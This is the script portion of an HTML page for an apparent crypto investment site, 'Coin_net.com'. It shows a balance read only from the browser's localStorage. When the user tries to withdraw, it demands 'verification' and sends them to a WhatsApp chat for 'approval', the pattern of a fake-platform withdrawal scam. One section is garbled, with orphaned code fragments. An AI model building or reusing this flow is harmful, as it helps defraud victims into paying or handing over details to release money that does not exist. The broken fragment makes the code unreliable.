<script>
document.addEventListener("DOMContentLoaded", () => {
  const withdrawBtn = document.querySelector(".bi-box-arrow-right").closest("a");

  withdrawBtn.addEventListener("click", async (e) => {
    e.preventDefault(); // stop default link behavior

    const balance = parseFloat(localStorage.getItem("userBalance") || "0.00");
    const currency = JSON.parse(localStorage.getItem("preferredCurrency")) || { symbol: "$", code: "usd" };

    if (balance > 0) {
      try {
        const converted = await convertCurrency(balance, currency.code.toLowerCase());
        const message = `Your balance is ${currency.symbol}${converted} (${currency.code.toUpperCase()}). please complete your verification to be able to withdraw your money`;
        showPopupWithButton(message, "https://wa.me/?text=Requesting%20approval%20from%20Coin_net.com");
      } catch (err) {
        showPopup("Failed to get balance. Please try again.");
      }
    } else {
      showPopup("You have no available balance to withdraw.");
    }
  });

  // Convert USD to preferred currency using CoinGecko API
  async function convertCurrency(amount, toCurrencyCode) {
    const res = await fetch("https://api.coingecko.com/api/v3/exchange_rates");
    const data = await res.json();

    const rate = data.rates[toCurrencyCode];
    if (!rate) throw new Error("Currency not found");

    const usdToBtc = 1 / data.rates["usd"].value;
    const usdInBtc = amount * usdToBtc;
    const finalAmount = usdInBtc * rate.value;

    return finalAmount.toFixed(2);
  }

  // Text-only popup (no button)
  function showPopup(text) {
    const popup = document.createElement("div");
    stylePopup(popup);
    popup.innerText = text;
    document.body.appendChild(popup);
    setTimeout(() => popup.remove(), 3000);
  }

  // Popup with OK button + auto-close after 5 sec
  function showPopupWithButton(text, redirectURL) {
    const popup = document.createElement("div");
    stylePopup(popup);

    const msg = document.createElement("div");
    msg.innerText = text;
    msg.style.marginBottom = "12px";

    const button = document.createElement("button");
    button.innerText = "Okay";
    button.style.padding = "8px 20px";
    button.style.background = "#fff";
    button.style.color = "#000";
    button.style.border = "none";
    button.style.borderRadius = "6px";
    button.style.cursor = "none";

    // Redirect if clicked
    button.onclick = () => {
      clearTimeout(autoClose); // prevent auto-close if clicked
      popup.remove();
      window.location.href = redirectURL;
    };

    popup.appendChild(msg);
    popup.appendChild(button);
    document.body.appendChild(popup);

    // Auto-close popup after 5 seconds if not clicked
    const autoClose = setTimeout(() => {
      popup.remove();
    }, 5000);
  }

  // Shared popup styling
  function stylePopup(popup) {
    popup.style.position = "fixed";
    popup.style.bottom = "20%";
    popup.style.left = "50%";
    popup.style.transform = "translateX(-50%)";
    popup.style.background = "#000";
    popup.style.color = "#fff";
    popup.style.padding = "20px";
    popup.style.border = "1px solid #fff";
    popup.style.borderRadius = "10px";
    popup.style.fontSize = "14px";
    popup.style.zIndex = "9999";
    popup.style.boxShadow = "0 4px 12px rgba(0,0,0,0.3)";
    popup.style.textAlign = "center";
    popup.style.minWidth = "250px";
  }
});
</script>

<script>
  function showTab(tab) {
    const activeTab = document.getElementById("activeTab");
    const completedTab = document.getElementById("completedTab");
    const activeContent = document.getElementById("activeContent");
    const completedContent = document.getElementById("completedContent");

    if (tab === "active") {
      activeTab.classList.add("tab-active");
      activeTab.classList.remove("tab-inactive");
      completedTab.classList.remove("tab-active");
      completedTab.classList.add("tab-inactive");
      activeContent.classList.remove("hidden");
      completedContent.classList.add("hidden");
    } else {
      completedTab.classList.add("tab-active");
      completedTab.classList.remove("tab-inactive");
      activeTab.classList.remove("tab-active");
      activeTab.classList.add("tab-inactive");
      completedContent.classList.remove("hidden");
      activeContent.classList.add("hidden");
    }
  }

  // Load history from localStorage
  const history = JSON.parse(localStorage.getItem("balanceHistory")) || [];
  const historyContainer = document.getElementById("historyTableContainer");
  document.getElementById("completedCount").textContent = history.length;

  if (history.length === 0) {
    historyContainer.innerHTML = `
      <div class="text-center">
        <div class="icon-ring">
          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
          </svg>
        </div>
        <p class="font-semibold text-lg">No Verified Cash-Out</p>
        <p class="font-semibold text-gray-400 text-sm mt-1">All verified cash-out transactions will be listed here.</p>
      </div>
    `;
  } else {
    history.forEach((item, index) => {
      const entry = document.createElement("div");
      entry.className = "history-card";

      entry.innerHTML = `
        <div class="info">
          <p class="text-white text-sm font-semibold">${index + 1}</p>
          <p class="text-white text-sm">$${parseFloat(item.balance).toFixed(2)}</p>
          <p class="text-gray-400 text-xs" style="margin-left: 20px;">${item.date}</p>
        </div>
        <div>
          <svg class="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
          </svg>
        </div>
      `;
      historyContainer.appendChild(entry);
    });
  }
</script>

<script>
  const dragTarget = document.getElementById('draggableTool');
  let isDragging = false;
  let offsetX, offsetY;

  dragTarget.addEventListener('mousedown', (e) => {
    isDragging = true;
    offsetX = e.clientX - dragTarget.getBoundingClientRect().left;
    offsetY = e.clientY - dragTarget.getBoundingClientRect().top;
    dragTarget.style.cursor = 'grabbing';
    dragTarget.style.animation = 'none'; // stop floating during drag
  });

  document.addEventListener('mousemove', (e) => {
    if (!isDragging) return;
    e.preventDefault();

    const newX = e.clientX - offsetX;
    const newY = e.clientY - offsetY;

    dragTarget.style.left = `${newX}px`;
    dragTarget.style.top = `${newY}px`;
    dragTarget.style.bottom = 'auto';
    dragTarget.style.right = 'auto';
  });

  document.addEventListener('mouseup', () => {
    if (isDragging) {
      dragTarget.style.animation = 'floatY 3s ease-in-out infinite'; // resume floating
    }
    isDragging = false;
    dragTarget.style.cursor = 'grab';
  });
</script>

if (match) {

        : `<span class="amount-large">****</span>`;

      toggleBtn.src = isVisible
        ? "https://img.icons8.com/ios-filled/50/invisible.png"
        : "https://img.icons8.com/ios-filled/50/visible.png";
    });
  });
</script>
  <style>
    #message-box {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #444;
      color: #fff;
      padding: 12px 20px;
      border-radius: 8px;
      font-size: 16px;
      opacity: 0;
      transition: opacity 0.3s ease;
      z-index: 1000;
    }

    #message-box.show {
      opacity: 1;
    }
  </style>
  <div id="message-box"></div>
  <script>
    const messageBox = document.getElementById('message-box');

    function showMessage(text, duration = 3000) {
      messageBox.textContent = text;
      messageBox.classList.add('show');

      setTimeout(() => {
        messageBox.classList.remove('show');
      }, duration);
    }

    window.addEventListener('online', () => {
      showMessage('You are now online.');
    });

    window.addEventListener('offline', () => {
      showMessage('Error: You are currently offline.');
    });
  </script>
</body>
</html>
